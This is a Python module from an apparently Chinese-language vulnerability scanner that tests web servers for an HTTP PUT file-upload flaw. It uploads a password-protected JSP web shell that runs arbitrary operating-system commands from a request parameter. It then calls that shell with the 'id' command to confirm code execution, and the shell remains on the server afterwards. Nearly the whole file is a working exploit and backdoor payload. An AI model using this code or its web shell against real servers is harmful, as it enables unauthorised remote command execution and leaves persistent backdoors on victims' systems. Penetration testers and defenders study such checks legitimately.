#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests, urllib3
from libs.outprint import OutPrintInfo,OutPrintInfoSuc
from libs.reqset import ReqSet
from libs.output import OutPutFile
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class ApachePutScan:
    def main(self,target):
        self.batch = target["batch_work"]

        host=target["url"].strip('/ ')
        ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        timeout = int(target["timeout"])

        if not self.batch:
            req = ReqSet(header=header, proxy=proxy)
            self.proxy = req["proxy"]
            self.headers = req["header"]
        else:
            self.proxy = {"http": proxy, "https": proxy}
            req = ReqSet(header=header)
            self.headers = req["header"]
        if not self.batch:
            OutPrintInfo("Apache", "开始检测Apache-PUT漏洞...")
        url = host+"/789.jsp"
        url2 = host+"/789.jsp?pwd=poc&i=id"
        data = """<% if("poc".equals(request.getParameter("pwd"))){
java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
int a = -1; byte[] b = new byte[2048]; out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b,0,a));
        }
        out.print("</pre>");
    }
%>"""
        headers = {
            "Host": host.split("://")[-1],
            "User-Agen": header,
            "Content-Type": "application/x-www-form-urlencoded",
        }
        try:
            response = requests.put(url, verify=ssl,proxies=self.proxy,data=data,headers=headers,timeout=timeout)
            ck = requests.get(url2,verify=ssl,proxies=self.proxy,headers=self.headers,timeout=timeout)
            if "gid=" in ck.text and ck.url == url2:
                OutPrintInfoSuc("Apache",f"存在Apache-PUT漏洞{url2}")

                if self.batch:
                    OutPutFile("apache_put_file.txt",f"存在Apache-PUT漏洞{url2}")
            else:
                if not self.batch:
                    OutPrintInfo("Apache", "目标不存在Apache-PUT漏洞")

        except Exception as e:
            if not self.batch:
                OutPrintInfo("Apache", "目标请求出错")
        if not self.batch:
            OutPrintInfo("Apache", "检测结束")

